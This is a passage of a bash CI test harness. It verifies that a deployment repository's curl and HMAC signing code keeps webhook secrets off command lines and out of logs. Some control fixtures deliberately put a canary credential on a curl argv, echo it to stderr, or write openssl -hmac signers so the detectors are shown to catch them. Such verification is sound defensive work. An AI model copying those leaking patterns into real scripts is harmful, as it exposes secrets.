s4_body() { s4_body_try "$@" || fatal "S4 could not build the step '$2' of $1 (it could not be extracted, an edit did not land or its environment could not be derived)"; }
# The names a step's environment DECLARES: the workflow-level `env:`, the job-level `env:` of its job, its own `env:`, and every NAME an earlier-or-later
# step of the job writes with `echo NAME=... >> $GITHUB_ENV` (a composite action's step has only its own). The same step match as s3_step_py.
s4_decl_py='
import sys, yaml, re
f, sel = sys.argv[1], sys.argv[2]
d = yaml.safe_load(open(f))
names = set()
def add(m):
    if isinstance(m, dict): names.update(str(k) for k in m)
add(d.get("env"))
groups = []
if isinstance(d.get("runs"), dict): groups.append((None, d["runs"].get("steps") or []))
else:
    for j in (d.get("jobs") or {}).values():
        if isinstance(j, dict): groups.append((j, j.get("steps") or []))
for job, steps in groups:
    for s in steps:
        if isinstance(s, dict) and isinstance(s.get("run"), str) and (s.get("id") == sel or str(s.get("name", "")).startswith(sel)):
            if job: add(job.get("env"))
            add(s.get("env"))
            for o in steps:
                if isinstance(o, dict) and isinstance(o.get("run"), str):
                    for line in o["run"].split("\n"):
                        m = re.match(r"^\s*echo\s+[\"\x27]?([A-Za-z_][A-Za-z0-9_]*)=.*>>\s*[\"\x27]?\$\{?GITHUB_ENV", line)
                        if m: names.add(m.group(1))
            print("\n".join(sorted(names))); sys.exit(0)
sys.exit(3)
'
s4_jobenv() { python3 -I -c 'import sys,yaml
d = yaml.safe_load(open(sys.argv[1]))
for k, v in ((d["jobs"][sys.argv[2]].get("env")) or {}).items():
    print("%s=%s" % (k, v))' "$1" "$2"; }
# Facts about the row just run.
s4_ncalls() { find "$S4_ROW/calls" -name '*.argv' 2>/dev/null | wc -l | tr -d ' '; }
s4_markers() { grep -c '^SOLEUR_CREDENTIAL_REFUSED script=' < <(cat "$S4_ROW/stdout" "$S4_ROW/stderr") || true; }
s4_said() { grep -qF -- "$1" < <(cat "$S4_ROW/stdout" "$S4_ROW/stderr"); }                  # a literal line fragment on stdout or stderr
s4_gho_has() { grep -qxF -- "$1" "$S4_ROW/gho"; }
s4_genv_has() { grep -qxF -- "$1" "$S4_ROW/genv"; }
# The planted canary appears in no captured stream (`::add-mask::` is the runner's own masking command and carries the value by design).
s4_canary_clean() { ! grep -qaF -- "$S4_CANARY" < <(grep -rahv '^::add-mask::' "$S4_ROW" 2>/dev/null); }
s4_argv_has() { local f; for f in "$S4_ROW"/calls/*.argv; do [[ -e "$f" ]] || continue; grep -qaF -- "$1" "$f" && return 0; done; return 1; }
# The recorded argv of the two tools besides curl (python3, openssl; the wrappers write $TOOLS_DIR/<tool>-<n>.argv): <tool> <needle>.
s4_tool_argv_has() { local f; for f in "$S4_ROW"/tools/"$1"-*.argv; do [[ -e "$f" ]] || continue; grep -qaF -- "$2" "$f" && return 0; done; return 1; }
s4_tool_ran() { local f; for f in "$S4_ROW"/tools/"$1"-*.argv; do [[ -e "$f" ]] && return 0; done; return 1; }
# The needle is on NO recorded argv of curl, python3 or openssl.
s4_nowhere_on_argv() { ! s4_argv_has "$1" && ! s4_tool_argv_has python3 "$1" && ! s4_tool_argv_has openssl "$1"; }
# s4_calls_ok <headers-per-call>: every recorded call read its stdin config (a blind shim records none), carries exactly that many bare
# `header = "..."` directives and nothing else, and has the confinement prefix (`--disable`, `--noproxy '*'`) and `--config -`.
s4_calls_ok() {
  local want="$1" f c ok=1 cnt=0 w
  local -a av
  for f in "$S4_ROW"/calls/*.argv; do
    [[ -e "$f" ]] || continue
    cnt=$((cnt + 1)); c="${f%.argv}"
    [[ -r "$c.stdin" ]] || { ok=0; continue; }
    [[ "$(grep -c '^header = "[^"\\]*"$' "$c.stdin")" == "$want" && "$(grep -vc '^header = "[^"\\]*"$' "$c.stdin")" == 0 ]] || ok=0
    mapfile -d '' av < "$f"
    [[ "${av[0]:-}" == --disable && "${av[1]:-}" == --noproxy && "${av[2]:-}" == '*' ]] || ok=0
    w=0; for ((i = 0; i + 1 < ${#av[@]}; i++)); do [[ "${av[i]}" == --config && "${av[i+1]}" == - ]] && w=1; done
    (( w )) || ok=0
  done
  (( cnt > 0 && ok ))
}
s4_stdin_line() { sed -n "${2}p" "$S4_ROW/calls/$1.stdin" 2>/dev/null; }  # <call> <line>
s4_oracle() { "$REAL_OSSL" dgst -sha256 -hmac "$1" < "$2" | sed 's/.*= //'; }  # <key> <file>

# ---- instrument controls (the stage aborts with FATAL when the instrument is blind) ----
# C1: the shim READS `--config -`: a directive piped to it is recorded, the body of a --data-binary @file is recorded, /tmp is remapped.
printf '%s\n' 'set -e' \
  'printf "{\"k\":1}" > "$RUNNER_TEMP/payload"' \
  'curl --disable --noproxy "*" -s -o /tmp/s4-ctl-out -w "%{http_code}" --max-time 5 -X POST --data-binary @"$RUNNER_TEMP/payload" --config - https://deploy.invalid/hooks/deploy < <(printf "header = \"X-Test: ctl\"\n")' > "$S4/ctl1.sh"
s4_run ctl1 "$S4/ctl1.sh" "$S4/real" SHIM_PROFILE=webhook
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_stdin_line 1 1)" == 'header = "X-Test: ctl"' && "$(cat "$S4_ROW/calls/1.body" 2>/dev/null)" == '{"k":1}' \
      && -e "$S4_ROW/calls/tmp/s4-ctl-out" && "$(cat "$S4_ROW/stdout")" == 202 ]] && s4_calls_ok 1; then
  row "S4 control: the recording curl reads --config -, records the --data-binary @file body, remaps /tmp and answers the webhook profile (202)" ok
else row "S4 control: the recording curl is blind" fail "rc=$S4_RC calls=$(s4_ncalls)"; fatal "S4 control C1: the recording curl does not read --config -"; fi
# C2: a BLIND curl (it never reads its stdin) must be judged RED by the very predicate the rows use.
s4_run ctl2 "$S4/ctl1.sh" "$S4/real" SHIM_PROFILE=webhook SHIM_NOSTDIN=1
if [[ "$(s4_ncalls)" == 1 ]] && ! s4_calls_ok 1; then row "S4 control: a curl that ignores --config - is judged RED by the credential-reaches-stdin predicate (the harness cannot be satisfied by a blind shim)" ok
else row "S4 control: a blind curl is not judged red" fail "calls=$(s4_ncalls)"; fi
# C3: a credential on curl's argv is seen by the argv predicate, and a hostile value planted in a stream is seen by the canary predicate.
printf '%s\n' 'curl -s -o /dev/null -H "X-Signature-256: sha256=$K" --config - https://deploy.invalid/x < <(printf "header = \"X: y\"\n")' 'echo "$K" >&2' > "$S4/ctl3.sh"
s4_run ctl3 "$S4/ctl3.sh" "$S4/real" "K=$S4_CANARY" SHIM_PROFILE=webhook
if s4_argv_has "$S4_CANARY" && ! s4_canary_clean; then row "S4 control: a credential on a recorded argv and a credential echoed to stderr are both seen (argv predicate and negative canary are not blind)" ok
else row "S4 control: the argv or canary predicate is blind" fail "argv=$(s4_argv_has "$S4_CANARY" && echo seen || echo missed)"; fi
# C4: the real-curl oracle behind the transport-failure rows: a closed port is exit 7 and `000`, so `|| echo 000` makes `000000`.
printf '%s\n' 'c=$(curl --disable --noproxy "*" -s -o /dev/null -w "%{http_code}" --max-time 5 https://deploy.invalid/x); echo "rc=$? first=$c"' \
  'c2=$(curl --disable --noproxy "*" -s -o /dev/null -w "%{http_code}" --max-time 5 https://deploy.invalid/x || echo "000"); echo "second=$c2"' > "$S4/ctl4.sh"
S4_SHIM="$S4/shimreal"; S4_FLAGS=(--noprofile --norc); s4_run ctl4 "$S4/ctl4.sh" "$S4/real"; S4_SHIM="$S4/shim"; S4_FLAGS=(--noprofile --norc -e)
if s4_said 'rc=7 first=000' && s4_said 'second=000000'; then row "S4 control: real curl against a closed port exits 7 and prints 000, and the sites' \`|| echo \"000\"\` makes the documented 000000" ok
else row "S4 control: the closed-port oracle drifted" fail "$(tr '\n' ' ' < "$S4_ROW/stdout")"; fi
# C5: the HMAC oracle is the OTHER implementation (the real openssl), and the library signs the same bytes.
printf '%s' '{"command":"synthetic"}' > "$S4/bodies/oracle-body"
S4_ORA_WANT="$(s4_oracle "$S4_KEY" "$S4/bodies/oracle-body")"
S4_ORA_GOT="$(env -i PATH="$S4/real" K="$S4_KEY" "$BASH_BIN" -c 'source "'"$REPO_ROOT"'/scripts/lib/bearer-curl.sh"; bc_hmac_sha256_hex K < "'"$S4"'/bodies/oracle-body"')"
[[ -n "$S4_ORA_WANT" && "$S4_ORA_GOT" == "$S4_ORA_WANT" ]] && row "S4 control: the library's bc_hmac_sha256_hex equals the independent openssl dgst -hmac digest over the same bytes" ok || row "S4 control: the HMAC oracle disagrees with the library" fail "lens=${#S4_ORA_WANT}/${#S4_ORA_GOT}"
# C6: the tool wrappers record argv and the predicate that reads them sees a credential on python3's or openssl's argument list (B5): a wrapper
# that logged nothing, or a predicate that never read the log, would make every HMAC row's "key on no tool argv" clause vacuous.
printf '%s\n' 'python3 -I -c "pass" "$K"' 'openssl dgst -sha256 -hmac "$K" < /dev/null > /dev/null' 'openssl version > /dev/null' > "$S4/ctl6.sh"
s4_run ctl6 "$S4/ctl6.sh" "$S4/real" "K=$S4_CANARY"
if s4_tool_ran python3 && s4_tool_ran openssl && s4_tool_argv_has python3 "$S4_CANARY" && s4_tool_argv_has openssl "$S4_CANARY" && ! s4_nowhere_on_argv "$S4_CANARY" \
   && s4_nowhere_on_argv "no-such-credential"; then
  row "S4 control: the python3 and openssl recording wrappers log argv, and the nowhere-on-argv predicate sees a credential on either tool's argument list (and not an absent one)" ok
else row "S4 control: the python3 or openssl wrapper is blind" fail "py=$(s4_tool_ran python3 && echo ran || echo none) ossl=$(s4_tool_ran openssl && echo ran || echo none)"; fatal "S4 control C6: the tool wrappers are blind"; fi
echo "=== stage S4: instrument controls done ==="

# =====================================================================================
# GUARD 1 (a): the HMAC census. Every tracked non-test, non-documentation file that signs with `openssl dgst ... -hmac <key>` puts
# the KEY on openssl's argv; since #9757 converted the last two (the registry-probe and doublefire-probe arms of the cutover script) NO
# production file does, and the allow-list is EMPTY. The census is DERIVED: every tracked file
# naming `-hmac` or `-macopt` is read STATEMENT by statement (backslash continuation lines joined first), and a statement that runs
# `openssl` with `-hmac` or `-macopt` is a hit WHATEVER the subcommand (`dgst`, `sha256`, `mac`, ...) or the line layout. The hits, minus
# Markdown, *.test.sh, tests/, fixtures, knowledge-base/, comment-only statements and the lint's own docstring, are compared to the
# allow-list by SET IDENTITY (path AND hit count, so a second argv HMAC in an allowed file is an unclassified member, and a deleted
# allow-list row while the file still signs is an unclassified member too). The derivation is itself fed a must-FAIL fixture for each
# spelling it claims to see (`openssl sha256 -hmac`, a continued `dgst`, `-macopt`, `openssl mac`) and must-PASS controls beside them.
# =====================================================================================
S4_HMAC_ALLOW=""
S4_HMAC_MD_ALLOW=""
s4_hmac_filter() { # stdin: grep -n lines (path:line:text) -> "path:count" per file after the exclusions
  awk -F: '{
    p = $1; t = substr($0, length($1) + length($2) + 3)
    if (p ~ /\.md$/ || p ~ /\.test\.(sh|ts)$/ || p ~ /^tests\// || p ~ /\/tests\// || p ~ /(^|\/)fixtures\// || p ~ /^knowledge-base\// || p == "scripts/lint-shell-trace-credential-refusal.py") next
    if (t ~ /^[[:space:]]*#/) next
    c[p]++
  } END { for (p in c) printf "%s:%d\n", p, c[p] }' | sort
}
s4_census_verdict() { # <census> <allow> -> prints "unclassified=... stale=..." and returns 0 when the two sets are identical
  local un st
  un="$(comm -23 <(printf '%s\n' "$1" | grep . | sort) <(printf '%s\n' "$2" | grep . | sort) | paste -sd, -)"
  st="$(comm -13 <(printf '%s\n' "$1" | grep . | sort) <(printf '%s\n' "$2" | grep . | sort) | paste -sd, -)"
  printf 'unclassified=%s stale=%s' "$un" "$st"
  [[ -z "$un" && -z "$st" ]]
}
# s4_hmac_scan <root>: stdin = relative file names; prints `path:line:statement` for every `openssl` statement (continuation lines joined; `line`
# is the statement's first physical line) that carries a `-hmac` or `-macopt` token, i.e. the HMAC key (or a key option) on openssl's argv.
s4_hmac_py='
import sys, re, os
root = sys.argv[1]
for rel in sys.stdin.read().split("\n"):
    if not rel: continue
    try: lines = open(os.path.join(root, rel), errors="replace").read().split("\n")
    except OSError: continue
    i = 0
    while i < len(lines):
        first = i; buf = lines[i]
        while buf.rstrip().endswith("\\") and i + 1 < len(lines):
            i += 1; buf = buf.rstrip()[:-1] + " " + lines[i].strip()
        if re.search(r"(^|[^A-Za-z0-9_.-])openssl([^A-Za-z0-9_-]|$)", buf) and re.search(r"(^|[\s\"\x27])-(hmac|macopt)([\s=\"\x27]|$)", buf):
            print("%s:%d:%s" % (rel, first + 1, buf))
        i += 1
'
s4_hmac_scan() { python3 -I -c "$s4_hmac_py" "$1"; }
S4_HMAC_RAW="$(cd "$REPO_ROOT" && git grep -lIE -e '-hmac' -e '-macopt' | s4_hmac_scan "$REPO_ROOT")"
S4_HMAC_CENSUS="$(printf '%s\n' "$S4_HMAC_RAW" | s4_hmac_filter)"
S4_HMAC_RAW_N="$(printf '%s\n' "$S4_HMAC_RAW" | grep -c . || true)"
S4_CEN_OUT="$(s4_census_verdict "$S4_HMAC_CENSUS" "$S4_HMAC_ALLOW")"; S4_CEN_RC=$?
if [[ "$S4_CEN_RC" == 0 && -z "$S4_HMAC_CENSUS" && -z "$S4_HMAC_ALLOW" ]]; then
  row "S4 HMAC census: the derived set of production files with an argv openssl -hmac equals the (empty) allow-list exactly: no tracked production file puts the HMAC key on openssl's argv" ok
else row "S4 HMAC census: the derived set differs from the allow-list" fail "$S4_CEN_OUT census='${S4_HMAC_CENSUS//$'\n'/,}'"; fi
# The documentation set, asserted separately: no agent-executed Markdown file teaches the argv form any more (an empty set).
S4_MD_SET="$(cd "$REPO_ROOT" && git grep -lIE -e '-hmac' -e '-macopt' -- '*.md' ':!knowledge-base' | s4_hmac_scan "$REPO_ROOT" | cut -d: -f1 | sort -u)"
if [[ "$S4_MD_SET" == "$S4_HMAC_MD_ALLOW" && -z "$S4_HMAC_MD_ALLOW" ]]; then row "S4 HMAC census: no Markdown file teaches the argv form (the documentation exception set is empty)" ok
else row "S4 HMAC census: a Markdown file teaches the argv openssl -hmac form again" fail "set='${S4_MD_SET//$'\n'/,}'"; fi
# Anti-vacuity floor: with the allow-list empty the production census is EMPTY by design, so "empty equals empty" proves nothing by itself. The
# derivation must still SEE what it excludes: the test-owned oracle statements (`openssl dgst -hmac` run with synthetic keys in *.test.sh and
# tests/) are scanned, counted and filtered out. A population that quietly emptied (a renamed pattern, a missing git) reads 0 here and reds.
# BOTH operands are literals on the lines IMMEDIATELY above the `if`.
S4_CENSUS_HITS="$(printf '%s\n' "$S4_HMAC_CENSUS" | awk -F: 'NF > 1 {n += $NF} END {print n + 0}')"
S4_CENSUS_SEEN="$(printf '%s\n' "$S4_HMAC_RAW" | awk -F: '$1 ~ /\.test\.(sh|ts)$/ || $1 ~ /^tests\// {n++} END {print n + 0}')"
S4_CENSUS_SEEN_FLOOR=10
if [[ "$S4_CENSUS_HITS" == 0 && "$S4_CENSUS_SEEN" -ge "$S4_CENSUS_SEEN_FLOOR" && "$S4_HMAC_RAW_N" -gt "$S4_CENSUS_SEEN" ]]; then row "S4 HMAC census: the derivation is not vacuous (0 production lines; it still sees $S4_CENSUS_SEEN test-owned oracle statements among $S4_HMAC_RAW_N tracked matches and excludes them; anti-vacuity floor $S4_CENSUS_SEEN_FLOOR)" ok
else row "S4 HMAC census: the derived population is empty (anti-vacuity floor)" fail "hits=$S4_CENSUS_HITS seen=$S4_CENSUS_SEEN raw=$S4_HMAC_RAW_N floor=$S4_CENSUS_SEEN_FLOOR"; fi
# The structural D4 predicate: none of the 15 S4 files carries `openssl dgst -hmac` in non-comment text (the census says so for the set;
# this names each file so a restored site is reported at its file).
S4_FILES=".github/actions/dispatch-web-redeploy/track.sh .github/actions/mint-infra-app-token/action.yml .github/scripts/bump-inngest-bootstrap-pin.sh
 .github/workflows/apply-deploy-pipeline-fix.yml .github/workflows/apply-github-infra.yml .github/workflows/apply-inngest-rls.yml
 .github/workflows/deploy-inngest-image.yml .github/workflows/restart-inngest-server.yml .github/workflows/scheduled-inngest-health.yml
 .github/workflows/web-platform-release.yml .github/workflows/workspaces-luks-cutover.yml apps/web-platform/infra/infra-config-verify.sh
 apps/web-platform/infra/push-infra-config.sh apps/web-platform/infra/scripts/verify-tunnel-ingress-origin.sh apps/web-platform/scripts/github-app-key-status.sh"
# s4_file_has_argv_hmac <repo-relative file>: a NON-comment statement of the file runs openssl with -hmac or -macopt (the scanner above, so a continued or non-dgst spelling counts).
s4_file_has_argv_hmac() { printf '%s\n' "$1" | s4_hmac_scan "$REPO_ROOT" | awk -F: '{ t = substr($0, length($1) + length($2) + 3); if (t !~ /^[[:space:]]*#/) n++ } END { exit n ? 0 : 1 }'; }
S4_D4_BAD=""; S4_NFILES=0
for f in $S4_FILES; do
  S4_NFILES=$((S4_NFILES + 1))
  [[ -f "$REPO_ROOT/$f" ]] || { S4_D4_BAD+=" $f(missing)"; continue; }
  s4_file_has_argv_hmac "$f" && S4_D4_BAD+=" $f"
done
[[ -z "$S4_D4_BAD" && "$S4_NFILES" == 15 ]] && row "S4 structure: none of the 15 S4 files carries openssl dgst -hmac in non-comment text (the key is never on openssl's argv)" ok || row "S4 structure: an S4 file signs with the key on openssl's argv" fail "$S4_D4_BAD n=$S4_NFILES"
# CONTROL for the wrapper itself (a verdict helper that is a pipe of python3 and awk answers "clean" when python3 crashes, the root is wrong or the awk slice is off by one, so every
# file above would pass for the wrong reason): it must see a SYNTHESIZED positive (no production file is a known positive any more: the cutover script was the last one),
# a synthesized continued `-hmac` spelling and a comment-only mention must NOT count, and converted files (the cutover script included) must be clean.
S4_HF="$S4/hmacfile"; assert_fixture_dir "$S4_HF"; mkdir -p "$S4_HF"
printf '%s\n' 'S=$(printf "" | openssl dgst -sha256 \' '    -hmac "$K")' > "$S4_HF/continued.sh"
printf '%s\n' '# S=$(printf "" | openssl dgst -sha256 -hmac "$K")' > "$S4_HF/comment.sh"
printf '%s\n' 'S=$(printf "" | openssl dgst -sha256 -hmac "$K" | sed s/x/y/)' > "$S4_HF/positive.sh"
S4_HF_BAD=""
s4_file_has_argv_hmac scripts/cutover-inngest.sh && S4_HF_BAD+=" converted-cutover-seen"
s4_file_has_argv_hmac apps/web-platform/infra/push-infra-config.sh && S4_HF_BAD+=" converted-file-seen"
S4_HF_ROOT_SAVE="$REPO_ROOT"; REPO_ROOT="$S4_HF"
s4_file_has_argv_hmac positive.sh || S4_HF_BAD+=" positive-not-seen"
s4_file_has_argv_hmac continued.sh || S4_HF_BAD+=" continued-not-seen"
s4_file_has_argv_hmac comment.sh && S4_HF_BAD+=" comment-seen"
s4_file_has_argv_hmac no-such-file.sh && S4_HF_BAD+=" missing-file-seen"
REPO_ROOT="$S4_HF_ROOT_SAVE"
[[ -z "$S4_HF_BAD" ]] && row "S4 structure control: the per-file argv-HMAC helper sees a synthesized positive and a synthesized backslash-continued -hmac, and does not see a comment-only mention, a missing file or a converted file (the cutover script included)" ok || row "S4 structure control: the per-file argv-HMAC helper is blind or over-matches" fail "$S4_HF_BAD"

# Harness rows for the census: a synthesized tree whose only HMAC is allowed MUST PASS; every other tree MUST FAIL. Both go through
# the SAME s4_hmac_filter / s4_census_verdict the live census uses (a pattern nothing ever fed a known positive and a known negative
# is not a control).
S4_CEN="$S4/cen"; assert_fixture_dir "$S4_CEN"; mkdir -p "$S4_CEN"
s4_cen_tree() { # <name> <variant>
  local t="$S4_CEN/$1"; assert_fixture_dir "$t"; mkdir -p "$t/scripts" "$t/docs" "$t/tests" "$t/knowledge-base" "$t/x"
  printf '%s\n' 'SIG=$(printf "" | openssl dgst -sha256 -hmac "$K" | sed s/x/y/)' '    SIG=$(printf "" | openssl dgst -sha256 -hmac "$K" | sed s/x/y/)' > "$t/scripts/synthetic-signer.sh"
  printf '%s\n' '# SIG=$(printf "" | openssl dgst -sha256 -hmac "$K")' > "$t/x/commented.sh"
  printf '%s\n' 'openssl dgst -sha256 -hmac "$K"' > "$t/docs/teaches.md"
  printf '%s\n' 'openssl dgst -sha256 -hmac "$K"' > "$t/x/a.test.sh"
  printf '%s\n' 'openssl dgst -sha256 -hmac "$K"' > "$t/tests/b.sh"
  printf '%s\n' 'openssl dgst -sha256 -hmac "$K"' > "$t/knowledge-base/c.txt"
  # NOT hits (the scanner must not over-match): a signer with a private KEY FILE, the word in a message, and a statement that is not openssl's.
  printf '%s\n' 'openssl dgst -sha256 -sign "$PEM" -binary' 'echo "pass -hmac to the other tool"' 'python3 -I -c "import hmac" -hmac' > "$t/x/benign.sh"
  case "$2" in
    allowed) ;;
    extra) printf '%s\n' 'S=$(openssl dgst -sha256 -hmac "$K")' > "$t/x/new-production.sh" ;;
    second) printf '%s\n' 'S=$(openssl dgst -sha256 -hmac "$K")' >> "$t/scripts/synthetic-signer.sh" ;;
    sha256) printf '%s\n' 'S=$(printf "" | openssl sha256 -hmac "$K")' > "$t/x/new-sha256.sh" ;;
    multiline) printf '%s\n' 'S=$(printf "" | openssl dgst -sha256 \' '    -hmac "$K")' > "$t/x/new-multiline.sh" ;;
    macopt) printf '%s\n' 'S=$(printf "" | openssl dgst -sha256 -mac HMAC -macopt "key:$K")' > "$t/x/new-macopt.sh" ;;
    mac) printf '%s\n' 'S=$(printf "" | openssl mac -digest SHA256 -macopt "hexkey:$K" HMAC)' > "$t/x/new-mac.sh" ;;
    abspath) printf '%s\n' 'S=$(printf "" | /usr/bin/openssl sha256 -hmac "$K")' > "$t/x/new-abspath.sh" ;;
  esac
  (cd "$t" && grep -rlIE -e '-hmac' -e '-macopt' . | sed 's|^\./||' | s4_hmac_scan "$t" | s4_hmac_filter)
}
# The synthesized tree carries its OWN allow-list (the live one is empty since #9757): the harness exercises the allow-list MECHANISM, not the repo.
S4_CT_ALLOW="scripts/synthetic-signer.sh:2"
S4_CT_OK="$(s4_cen_tree ok allowed)"; s4_census_verdict "$S4_CT_OK" "$S4_CT_ALLOW" > /dev/null; S4_CT_OK_RC=$?
S4_CT_EX="$(s4_cen_tree extra extra)"; s4_census_verdict "$S4_CT_EX" "$S4_CT_ALLOW" > /dev/null; S4_CT_EX_RC=$?
S4_CT_2="$(s4_cen_tree second second)"; s4_census_verdict "$S4_CT_2" "$S4_CT_ALLOW" > /dev/null; S4_CT_2_RC=$?
S4_CT_SHAPE_BAD=""
for cv in sha256 multiline macopt mac abspath; do
  S4_CT_V="$(s4_cen_tree "v-$cv" "$cv")"
  if s4_census_verdict "$S4_CT_V" "$S4_CT_ALLOW" > /dev/null; then S4_CT_SHAPE_BAD+=" $cv"; fi
  [[ "$S4_CT_V" == *"x/new-$cv.sh:1"* ]] || S4_CT_SHAPE_BAD+=" $cv(unnamed:$S4_CT_V)"
done
s4_census_verdict "$S4_CT_OK" "" > /dev/null; S4_CT_DEL_RC=$?
[[ "$S4_CT_OK_RC" == 0 && "$S4_CT_OK" == "scripts/synthetic-signer.sh:2" ]] && row "S4 HMAC census control: a synthesized tree whose only HMAC is allowed (plus a comment-only line, Markdown, test, tests/ and knowledge-base/ copies, an openssl -sign statement and the word -hmac in a message) is GREEN" ok || row "S4 HMAC census control: the allowed tree is not green" fail "got='$S4_CT_OK' rc=$S4_CT_OK_RC"
[[ "$S4_CT_EX_RC" != 0 ]] && row "S4 HMAC census control: an extra unlisted production file with an argv HMAC is RED (unclassified member)" ok || row "S4 HMAC census control: an extra member is accepted" fail "got='$S4_CT_EX'"
[[ -z "$S4_CT_SHAPE_BAD" ]] && row "S4 HMAC census control: each spelling the derivation claims to see is RED when an unlisted production file uses it (openssl sha256 -hmac, a dgst whose -hmac is on a backslash-continuation line, -mac HMAC -macopt, openssl mac -macopt, an absolute-path openssl) and is named at its file" ok || row "S4 HMAC census control: a key-on-argv spelling is accepted by the census" fail "$S4_CT_SHAPE_BAD"
[[ "$S4_CT_2_RC" != 0 ]] && row "S4 HMAC census control: a SECOND argv HMAC after a compliant first, in an allowed file, is RED (the census compares per-file counts, not 'at least one clean')" ok || row "S4 HMAC census control: a second member in an allowed file is accepted" fail "got='$S4_CT_2'"
[[ "$S4_CT_DEL_RC" != 0 ]] && row "S4 HMAC census control: deleting the allow-list row while the file still signs is RED (the allow-list cannot shrink silently)" ok || row "S4 HMAC census control: a deleted allow-list row is accepted" fail ""
# The live census, fed the cutover script with ONE probe arm put back on `openssl dgst -hmac` (the mutants of stage S2-A part 2): each is RED against the
# empty allow-list and is named at its file with exactly one hit. The scan root is the mutant directory, so the same s4_hmac_scan / filter / verdict the live
# census uses judge it.
S4_RV_BAD=""
for rv in revert1 revert2; do
  S4_RV_CEN="$(printf '%s\n' "hm-mut-$rv.sh" | s4_hmac_scan "$BKDIR" | s4_hmac_filter)"
  s4_census_verdict "$S4_RV_CEN" "$S4_HMAC_ALLOW" > /dev/null && S4_RV_BAD+=" $rv(accepted)"
  [[ "$S4_RV_CEN" == "hm-mut-$rv.sh:1" ]] || S4_RV_BAD+=" $rv(census='$S4_RV_CEN')"
done
[[ -z "$S4_RV_BAD" ]] && row "S4 HMAC census mutation: either probe arm of the cutover script reverted to openssl dgst -hmac is RED against the empty allow-list, with exactly one hit named" ok || row "S4 HMAC census mutation: a reverted probe arm is accepted by the census" fail "$S4_RV_BAD"
# The inline copies of the canonical snippet are a DERIVED population too: every tracked non-test file holding it is in this explicit set.
S4_INLINE_FILES="$(printf '%s\n' .github/workflows/deploy-inngest-image.yml .github/workflows/web-platform-release.yml apps/web-platform/infra/infra-config-verify.sh apps/web-platform/infra/scripts/verify-tunnel-ingress-origin.sh scripts/cutover-inngest.sh | sort)"
S4_INLINE_DERIVED="$(cd "$REPO_ROOT" && git grep -lF 'HMAC_KEY="$WEBHOOK_SECRET" python3 -I -c' -- . ':!tests' ':!knowledge-base' ':!*.test.sh' ':!*.md' | sort)"
if [[ "$S4_INLINE_DERIVED" == "$S4_INLINE_FILES" ]]; then row "S4 parity population: the files holding the canonical inline HMAC snippet are exactly the cutover script and the four S4 inline files (derived by git grep, never counted; Markdown is judged by the next row)" ok
else row "S4 parity population: a file holds the canonical inline HMAC snippet that no audit judges" fail "derived='${S4_INLINE_DERIVED//$'\n'/,}'"; fi
# The agent-executed Markdown teaches the SAME snippet (the argv `openssl -hmac` form it used to teach is gone, see the census above): the set of Markdown files that
# carry it is exactly these two, and each carries the canonical snippet BYTE FOR BYTE (a doc that drifted would teach an operator a divergent signer).
S4_MD_CANON_FILES="$(printf '%s\n' plugins/soleur/skills/postmerge/references/deploy-status-debugging.md plugins/soleur/skills/ship/SKILL.md)"
S4_MD_CANON_DERIVED="$(cd "$REPO_ROOT" && git grep -lF 'HMAC_KEY="$WEBHOOK_SECRET" python3 -I -c' -- '*.md' ':!knowledge-base' | sort)"
S4_MD_CANON_BAD=""
for f in $S4_MD_CANON_DERIVED; do [[ "$(grep -cF -- "$HM_CANON" "$REPO_ROOT/$f" || true)" -ge 1 ]] || S4_MD_CANON_BAD+=" $f"; done
if [[ "$S4_MD_CANON_DERIVED" == "$S4_MD_CANON_FILES" && -z "$S4_MD_CANON_BAD" ]]; then row "S4 parity population: the Markdown files that teach the canonical inline HMAC snippet are exactly ship/SKILL.md and postmerge/references/deploy-status-debugging.md, and each carries it byte for byte" ok
else row "S4 parity population: a Markdown file teaches a divergent or unlisted HMAC snippet" fail "derived='${S4_MD_CANON_DERIVED//$'\n'/,}' divergent:$S4_MD_CANON_BAD"; fi

# =====================================================================================
# GUARD 1 (c): the library-user manifest. S3 derives the YAML population (S3_POP: steps and composites that source the library);
# S4 adds the SCRIPTS that source it on a step's behalf (a script file invoked by a `run:` or a terraform provisioner). The set is
# derived from the tree and compared to an explicit manifest; each script is judged structurally (the library sourced before its
# first bc_* use; no credential header literal inside a bc_curl statement; no stderr discard on one; no branch on rc == 2; the marker
# names the file).
# =====================================================================================
S4_SCRIPT_MANIFEST="$(printf '%s\n' .github/actions/dispatch-web-redeploy/track.sh apps/web-platform/infra/push-infra-config.sh apps/web-platform/scripts/github-app-key-status.sh scripts/probe-github-app-mint.sh apps/web-platform/infra/git-data-wipe.sh scripts/inngest-link-flip.sh | sort)"
S4_SCRIPT_POP="$(cd "$REPO_ROOT" && git grep -lE '^[[:space:]]*(source|\.)[[:space:]].*scripts/lib/bearer-curl\.sh' -- '*.sh' ':!*.test.sh' ':!tests' ':!scripts/lib' | sort)"
S4_SU="$(comm -23 <(printf '%s\n' "$S4_SCRIPT_POP" | grep .) <(printf '%s\n' "$S4_SCRIPT_MANIFEST"))"
S4_SS="$(comm -13 <(printf '%s\n' "$S4_SCRIPT_POP" | grep .) <(printf '%s\n' "$S4_SCRIPT_MANIFEST"))"
if [[ -z "$S4_SU" && -z "$S4_SS" && -n "$S4_SCRIPT_POP" ]]; then row "S4 population: every script that sources the library is in the manifest and every manifest member still does ($(printf '%s\n' "$S4_SCRIPT_POP" | grep -c .) scripts)" ok
else row "S4 population: the derived script set differs from the manifest" fail "unclassified='${S4_SU//$'\n'/,}' stale='${S4_SS//$'\n'/,}'"; fi
# The S4 additions to the YAML population (S3_MANIFEST now holds them; the S3 structure rows already judge every member).
S4_YML_NEW=".github/actions/mint-infra-app-token/action.yml .github/workflows/apply-deploy-pipeline-fix.yml .github/workflows/apply-github-infra.yml .github/workflows/apply-inngest-rls.yml .github/workflows/restart-inngest-server.yml .github/workflows/scheduled-inngest-health.yml"
S4_YML_MISS=""; for f in $S4_YML_NEW; do grep -qxF -- "$f" <<<"$S3_POP" || S4_YML_MISS+=" $f"; done
[[ -z "$S4_YML_MISS" ]] && row "S4 population: the five newly converted YAML files and the converted inngest-health probe are all in the derived library-user set ($(printf '%s\n' "$S3_POP" | grep -c .) YAML members in all, judged by the S3 structure rows)" ok || row "S4 population: a converted YAML file is not a derived library user" fail "$S4_YML_MISS"
# Anti-vacuity floor on the two derived populations (BOTH operands are literals on the lines IMMEDIATELY above the `if`).
S4_POP_FLOOR=24
